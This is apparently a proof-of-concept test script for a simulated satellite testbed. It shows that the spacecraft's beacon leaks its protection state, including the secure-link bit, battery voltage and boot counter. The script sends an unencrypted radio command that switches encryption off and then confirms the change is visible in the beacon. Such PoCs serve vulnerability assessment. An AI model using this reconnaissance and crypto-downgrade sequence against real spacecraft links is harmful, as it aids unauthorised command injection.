#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-02  Over-talkative beacon: mission mode, secure-link bit, battery,
# eclipse, boot counter -- protection state readable with zero intrusion.
# SPARTA: RT-0001.03 / RE-0003.02
def main(dev, ev):
    dev.tc(0x05, b"\x01", via="usb")                 # beacon every 1 s
    tms = dev.advance(2500)
    bc = [t for t in dev.find(tms, 0x01) if t.payload[1:7] == b"Beacon"]
    check(bc, "beacon expected")
    b = bc[0]
    mode, flags, flags2 = b.u8(8), b.u8(9), b.u8(10)
    bus = b.le16(11) / 100.0
    tilt = b.le16(13) / 100.0
    ev.log(f"beacon: mode=0x{mode:02X} flags=0x{flags:02X} flags2=0x{flags2:02X} "
           f"bus={bus:.2f}V tilt={tilt:.2f} boot={b.u8(20)}")
    check(bool(flags & 0x10) == dev.sim.secure, "beacon leaks SECURE_LINK bit")
    check(abs(bus - dev.sim.mm["bus_v"]) < 0.05,
          "beacon battery model readable")
    # protection state change is visible passively:
    dev.tc(0x0A, b"\x00", via="radio", encrypt=False)   # crypto off (V0-10)
    tms = dev.advance(1500)
    b2 = [t for t in dev.find(tms, 0x01) if t.payload[1:7] == b"Beacon"][0]
    ev.log(f"after AES-off beacon flags=0x{b2.u8(9):02X} (SEC bit cleared)")
    check(not (b2.u8(9) & 0x10), "beacon reflects crypto downgrade instantly")
    ev.log("attacker picks the injection window from the beacon alone")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-02 chatty beacon exposes protection state", main))
